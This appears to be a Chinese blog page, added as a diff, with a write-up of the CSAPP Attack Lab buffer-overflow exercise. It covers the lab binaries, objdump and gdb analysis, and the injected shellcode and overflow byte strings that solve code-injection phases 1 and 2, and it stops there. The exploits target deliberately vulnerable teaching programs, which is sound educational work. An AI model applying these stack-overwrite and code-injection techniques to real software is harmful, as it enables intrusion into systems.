@@ -1,0 +1,906 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.abug0.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"buttons","active":"gitalk","storage":true,"lazyload":false,"nav":{"gitalk":{"text":"gitalk(github评论)","order":-2},"valine":{"text":"匿名评论(Anonymous)","order":-1}},"activeClass":"gitalk"},"algolia":{"appID":"V8S440A7R6","apiKey":"5f18489120f06717c74217be61ca3feb","indexName":"abug0","hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="介绍实验目的本实验旨在了解和学习缓冲区溢出攻击的两种方式：  Code Injection Attacks(CI)：代码注入攻击 Return-Oriented Programming(ROP): ROP攻击  文件介绍">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAPP Attack Lab-缓冲区溢出攻击实验">
+<meta property="og:url" content="https://www.abug0.com/IT/CSAPP/CSAPP%20Attack%20Lab-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C.html">
+<meta property="og:site_name" content="abug0的博客">
+<meta property="og:description" content="介绍实验目的本实验旨在了解和学习缓冲区溢出攻击的两种方式：  Code Injection Attacks(CI)：代码注入攻击 Return-Oriented Programming(ROP): ROP攻击  文件介绍">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/202208061601064.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220807083800.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220807114205.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220808213607.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220808213859.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220808214628.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/202208091801966.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220814203251.png">
+<meta property="article:published_time" content="2022-08-08T11:03:41.000Z">
+<meta property="article:modified_time" content="2022-08-26T10:04:11.000Z">
+<meta property="article:author" content="abug0">
+<meta property="article:tag" content="CSAPP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/202208061601064.png">
+
+<link rel="canonical" href="https://www.abug0.com/IT/CSAPP/CSAPP%20Attack%20Lab-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CSAPP Attack Lab-缓冲区溢出攻击实验 | abug0的博客</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?dfa0fbb598015665cff81cbb01b109d3";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">abug0的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Simple is Beautiful.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">18</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">23</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">57</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+      
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.abug0.com/IT/CSAPP/CSAPP%20Attack%20Lab-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="abug0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="abug0的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CSAPP Attack Lab-缓冲区溢出攻击实验
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-08-08 11:03:41" itemprop="dateCreated datePublished" datetime="2022-08-08T11:03:41+00:00">2022-08-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-08-26 10:04:11" itemprop="dateModified" datetime="2022-08-26T10:04:11+00:00">2022-08-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/IT/" itemprop="url" rel="index"><span itemprop="name">IT</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/IT/CSAPP/" itemprop="url" rel="index"><span itemprop="name">CSAPP</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/IT/CSAPP/CSAPP%20Attack%20Lab-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C.html" class="post-meta-item leancloud_visitors" data-flag-title="CSAPP Attack Lab-缓冲区溢出攻击实验" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/IT/CSAPP/CSAPP%20Attack%20Lab-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/IT/CSAPP/CSAPP%20Attack%20Lab-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>9.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><p>本实验旨在了解和学习缓冲区溢出攻击的两种方式：</p>
+<ul>
+<li>Code Injection Attacks(CI)：代码注入攻击</li>
+<li>Return-Oriented Programming(ROP): ROP攻击</li>
+</ul>
+<h3 id="文件介绍"><a href="#文件介绍" class="headerlink" title="文件介绍"></a>文件介绍</h3><ul>
+<li>README.md: 文件描述；</li>
+<li>ctarget: 可执行文件，存在CI漏洞，完成实验phase 1-3；</li>
+<li>rtarget: 可执行文件，存在ROP漏洞，完成实验phase 4-5;</li>
+<li>hex2raw: 将十六进制转换为对应的输入字符串；</li>
+<li>cookie.txt: 实验中需要用到的8位十六进制数；</li>
+<li>farm.c: gadgets的源码。</li>
+</ul>
+<h3 id="程序说明"><a href="#程序说明" class="headerlink" title="程序说明"></a>程序说明</h3><p>ctarget和rtarget都会从标准输入中读取字符串，函数如下：</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        示例代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">	Gets(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+    </div>
+</div>
+
+<p>Gets类似于库函数gets，它会从标准输入读取字符串（“\n”作为结尾）存储到buf中，且不会检查缓冲区和字符串的长度，因此存在缓冲区溢出漏洞。</p>
+<p>getbuf会在test中被调用：</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        示例代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> val;</span><br><span class="line">	val = getbuf();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    </div>
+</div>
+
+
+
+<p>ctarget和rtarget的使用：</p>
+<blockquote>
+<p>Both CTARGET and RTARGET take several different command line arguments: </p>
+<p>-h: Print list of possible command line arguments </p>
+<p>-q: Don’t send results to the grading server </p>
+<p>-i FILE: Supply input from a file, rather than from standard input</p>
+</blockquote>
+<p>使用时带上-q参数以避免远程服务器校验。</p>
+<h2 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h2><h3 id="Part-1-Code-Injection-Attacks"><a href="#Part-1-Code-Injection-Attacks" class="headerlink" title="Part 1: Code Injection Attacks"></a>Part 1: Code Injection Attacks</h3><p>这一阶段的目标程序是ctarget，其具有如下特点：</p>
+<ul>
+<li>栈地址固定</li>
+<li>栈具有可执行权限</li>
+</ul>
+<h4 id="Phase-1：getbuf执行后去调用touch1，而不再是返回test；"><a href="#Phase-1：getbuf执行后去调用touch1，而不再是返回test；" class="headerlink" title="Phase 1：getbuf执行后去调用touch1，而不再是返回test；"></a>Phase 1：getbuf执行后去调用touch1，而不再是返回test；</h4><p>程序中存在代码：</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        示例代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">	validate(<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+    </div>
+</div>
+
+
+
+<h4 id="Phase2-getbuf执行后去调用touch2"><a href="#Phase2-getbuf执行后去调用touch2" class="headerlink" title="Phase2: getbuf执行后去调用touch2;"></a>Phase2: getbuf执行后去调用touch2;</h4><div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        示例代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vlevel = <span class="number">2</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		validate(<span class="number">2</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		fail(<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+    </div>
+</div>
+
+<h4 id="Phase-3-getbuf执行后去调用touch3"><a href="#Phase-3-getbuf执行后去调用touch3" class="headerlink" title="Phase 3:  getbuf执行后去调用touch3;"></a>Phase 3:  getbuf执行后去调用touch3;</h4><div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        示例代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">	<span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">	<span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		fail(<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    </div>
+</div>
+
+<h3 id="Part-2：-Return-Oriented-Programming"><a href="#Part-2：-Return-Oriented-Programming" class="headerlink" title="Part 2： Return-Oriented Programming"></a>Part 2： Return-Oriented Programming</h3><p>目标程序是rtarget，与ctarge相比，其特点是：</p>
+<ul>
+<li>栈空间地址是随机的</li>
+<li>栈不可执行</li>
+</ul>
+<p>ROP的原理是利用堆栈来控制返回地址，让进程跳转到精心挑选的指令或指令片段处，而这些指令或指令片段往往是已存在于程序代码段的，故而可以绕过ALSR和DEP。</p>
+<p>在rtarget中，可供利用的gadget都在start_farm和end_farm之间。</p>
+<h4 id="Phase-4-getbuf执行后去调用touch2"><a href="#Phase-4-getbuf执行后去调用touch2" class="headerlink" title="Phase 4: getbuf执行后去调用touch2;"></a>Phase 4: getbuf执行后去调用touch2;</h4><h4 id="Phase-5-getbuf执行后去调用touch3"><a href="#Phase-5-getbuf执行后去调用touch3" class="headerlink" title="Phase 5: getbuf执行后去调用touch3;"></a>Phase 5: getbuf执行后去调用touch3;</h4><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="CI-phase-1"><a href="#CI-phase-1" class="headerlink" title="CI(phase 1)"></a>CI(phase 1)</h3><p>使用objdump 反汇编看一下ctarget：</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        示例代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ctarget</span><br></pre></td></tr></table></figure>
+    </div>
+</div>
+
+<p>找到getbuf函数，如图。可以看到函数内部在栈上申请了40bytes的空间，而后调用Gets读取输入，并将之存储到栈上。</p>
+<p><img src="https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/202208061601064.png" alt="image-20220806160116333"></p>
+<p>回忆一下关于栈帧的知识，getbuf调用Gets时（执行到0x4017ac）的栈空间如图:</p>
+<p><img src="https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220807083800.png" alt="image-20220807083753223"></p>
+<p>我们要去调用touch1，只需要将返回地址替换为touch1的地址即可。从汇编指令可以看出getbuf调用Gets传递的参数就是此时的栈顶（rsp），即Gets会将读取的输入字符串存入栈顶为起始的地址中，且存储时方向是从低地址到高地址的。那么此处只需要用40 Bytes填充栈，而后就可以覆盖掉返回地址。</p>
+<p>另外此处程序采用小端序存储，所以输入指令地址时需要将低位放在内存中的低地址处。最终设计出输入字符串：</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        示例代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+    </div>
+</div>
+
+<p>执行：</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        示例代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hex2raw &lt;attack1.txt &gt;attack1raw.txt</span><br><span class="line">ctarget -q -i attack1raw.txt</span><br></pre></td></tr></table></figure>
+    </div>
+</div>
+
+<p>结果：</p>
+<p><img src="https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220807114205.png" alt="image-20220807114205671"></p>
+<h3 id="CI-phase-2"><a href="#CI-phase-2" class="headerlink" title="CI(phase 2)"></a>CI(phase 2)</h3><p>这次需要调用touch2，从源码可以看到，需要将cookie作为参数传递进去。</p>
+<p>回忆一下，汇编中传递参数的方式：寄存器和栈，会依次使用rdi、rsi、rdx、rcx、r8、r9等寄存器传递参数，更多的参数会使用栈来进行传递。</p>
+<p>那么此处传参只需要在调用touch2前将cookie放入寄存器rdi中即可。</p>
+<p>所以此处需要做的是：</p>
+<ul>
+<li>修改返回地址为touch2的地址</li>
+<li>将cookie放入寄存器rdi</li>
+</ul>
+<p>修改返回地址在Phase 1已经做过，只需覆盖即可，那么剩下的就是修改寄存器了。比较容易想到的两种操控寄存器的方法是编写汇编指令和利用已有指令，那么先整理一下目前的条件：</p>
+<ul>
+<li>栈地址固定</li>
+<li>栈可执行</li>
+</ul>
+<p>于是想到可以直接注入代码到栈上，通过注入代码操控寄存器的值，如此只需将返回地址修改为注入代码的地址、然后在注入代码中跳转touch2即可。</p>
+<p>写出注入代码：</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        示例代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa, %rdi	;cookie存入rdi</span><br><span class="line">push $0x4017ec			;touch2指令的地址入栈, 通过ret跳转到touch2</span><br><span class="line">ret						;跳转到touch2</span><br></pre></td></tr></table></figure>
+    </div>
+</div>
+
+<p>编译这段代码，然后反汇编得到对应的十六进制表示：</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        示例代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@machine target1]# gcc attack.s -c</span><br><span class="line">[root@machine target1]# objdump -d attack.o</span><br><span class="line"></span><br><span class="line">attack.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi</span><br><span class="line">   7:	68 ec 17 40 00       	pushq  $0x4017ec</span><br><span class="line">   c:	c3                   	retq</span><br></pre></td></tr></table></figure>
+    </div>
+</div>
+
+<p>另外还需要得到注入代码的内存地址（即getbuf中的栈顶地址），以确定返回地址。</p>
+<p>使用gdb进行调试，首先看一下反汇编得到的指令地址，要得到getbuf中的栈顶地址，我们可以在mov %rsp, %rdi指令处打断点，对应的指令地址为0x4017ac:</p>
+<p><img src="https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220808213607.png" alt="image-20220808213607260"></p>
+<p><img src="https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220808213859.png" alt="image-20220808213859401"></p>
+<p>可以看到栈顶地址为0x5561dc78，结合前面注入代码的是十六进制表示，最终可以得到整个输入字符串的十六进制表示：</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        示例代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68 </span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+    </div>
+</div>
+
+<p>执行：</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        示例代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hex2raw &lt;attack2.txt &gt;attack2raw.txt</span><br><span class="line">ctarget -q -i attack2raw.txt</span><br></pre></td></tr></table></figure>
+    </div>
+</div>
+
+<p>攻击成功：</p>
+<p><img src="https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220808214628.png" alt="image-20220808214628387"></p>
